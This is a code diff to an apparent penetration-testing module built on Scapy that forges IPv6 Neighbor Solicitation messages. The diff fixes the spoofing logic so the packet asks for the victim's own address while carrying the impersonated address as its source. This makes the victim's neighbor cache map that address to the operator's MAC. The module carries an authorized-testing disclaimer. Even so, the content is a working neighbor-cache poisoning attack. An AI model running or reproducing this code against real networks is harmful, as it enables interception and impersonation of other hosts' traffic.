@@ -5,8 +5,8 @@ Address option (RFC 4861). A host that receives an NS from an IPv6 address recor
 address for the address, and it does so without any reply. The attacker only has to send the NS.
 
 This module sends NS messages whose IPv6 source is the address you want to impersonate, whose
-Source Link-Layer Address option is the operator's MAC, and whose destination is the solicited-node
-multicast address of that address, with hop limit 255. The effect to measure is whether a host that
+Source Link-Layer Address option is the operator's MAC, whose target is the victim's own address, and
+whose destination is the victim's solicited-node multicast address, with hop limit 255. The effect to measure is whether a host that
 has an entry for the impersonated address replaces its link-layer address with the operator's MAC.
 
 Intended only for networks you own or are explicitly authorized to test.
@@ -86,13 +86,15 @@ def build_solicitation(config: NeighborSolicitationSpoofingConfig) -> Packet:
     """One NS: IPv6 source and NS target = the impersonated address, Source Link-Layer Address = the operator's MAC."""
     source = normalize_unicast_mac(config.source_mac)
     target = validate_target(config.target)
-    # Send to the solicited-node group of the receiver when one is given: only hosts with that
-    # address join the group, so a victim that is not the target's owner must be named here.
-    group = solicited_node(validate_target(config.receiver) if config.receiver else target)
+    # A host records the source of an NS only when the NS asks for one of its own addresses. So with a
+    # receiver, the NS asks for the receiver's address, is sent to its solicited-node group, and carries
+    # the impersonated target as its IPv6 source. Without a receiver, the NS asks for the target itself.
+    victim = validate_target(config.receiver) if config.receiver else target
+    group = solicited_node(victim)
     return (
         Ether(src=source, dst=solicited_node_mac(group))
         / IPv6(src=str(target), dst=str(group), hlim=255)
-        / ICMPv6ND_NS(tgt=str(target))
+        / ICMPv6ND_NS(tgt=str(victim))
         / ICMPv6NDOptSrcLLAddr(lladdr=source)
     )
 
